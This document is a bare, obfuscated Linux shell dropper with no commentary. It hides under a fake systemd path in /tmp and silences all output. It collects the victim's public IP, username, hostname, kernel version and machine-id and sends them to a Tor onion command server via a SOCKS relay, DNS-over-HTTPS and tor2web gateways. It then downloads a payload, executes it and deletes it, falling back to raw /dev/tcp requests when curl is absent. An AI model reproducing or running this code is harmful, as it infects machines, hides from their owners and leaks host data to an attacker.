z3glwn
exec &>/dev/null
BDrFYzWg=./.$(date|md5sum|head -c20)
qyynvpBQ=(doh-ch.blahdns.com doh-de.blahdns.com doh-jp.blahdns.com doh-sg.blahdns.com doh.li doh.pub doh.dns.sb dns.twnic.tw)
sNHouYjx="/tmp/systemd-private-ae776206422e886961eefb358c4fefda-systemd-logind.service-z3glwn"
GRPoNTxD="curl -m60 -fsSLkA- --doh-url https://${qyynvpBQ[$((RANDOM%${#qyynvpBQ[@]}))]}/dns-query"
ZwJtGQaC="curl -m60 -fsSLkA-"
HNPDsmwz="relay.tor2socks.in"
HyMbvhNq="ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad"
PATH=/tmp:$sNHouYjx:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:$PATH

eGiAsomX() {
	read proto server path <<<$(echo ${1//// })
	DOC=/${path// //}
	HOST=${server//:*}
	PORT=${server//*:}
	[[ x"${HOST}" == x"${PORT}" ]] && PORT=80
	exec 3<>/dev/tcp/${HOST}/$PORT
	echo -en "GET ${DOC} HTTP/1.0\r\nUser-Agent: -\r\nHost: ${HOST}\r\n\r\n" >&3
	(while read line; do
	[[ "$line" == $'\r' ]] && break
	done && cat) <&3
	exec 3>&-
}

bCQYhArV() {
	for i in $sNHouYjx . /usr/bin /var/tmp /tmp ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done
}

XNSBjYOO() {
	HoVCQHFu=/exec
	LouMQEck=rq1_$(curl -s4 ident.me||curl -4 ip.sb)_$(whoami)_$(uname -n)_$(uname -r)_$(cat /etc/machine-id||(ip r||hostname -i||echo no-id)|md5sum|awk NF=1)
	$GRPoNTxD -x socks5h://$HNPDsmwz:9050 -e$LouMQEck $HyMbvhNq.onion$HoVCQHFu -o$BDrFYzWg || $GRPoNTxD -e$LouMQEck $1$HoVCQHFu -o$BDrFYzWg || $ZwJtGQaC -x socks5h://$HNPDsmwz:9050 -e$LouMQEck $HyMbvhNq.onion$HoVCQHFu -o$BDrFYzWg || $ZwJtGQaC -e$LouMQEck $1$HoVCQHFu -o$BDrFYzWg
}

MPQKanDg() {
	chmod +x $BDrFYzWg;$BDrFYzWg;rm -f $BDrFYzWg
}

dtOFCAtT() {
	u=$HyMbvhNq.tor2web.it/load/
	cd /tmp && curl -V || (eGiAsomX http://$u/cu) | tar zxp
	bCQYhArV
	XNSBjYOO $HyMbvhNq.tor2web.it ||
	XNSBjYOO $HyMbvhNq.tor2web.in ||
	XNSBjYOO $HyMbvhNq.tor2web.re
	MPQKanDg
}

ls /proc/$(head -1 /tmp/.systemd.1)/maps || dtOFCAtT
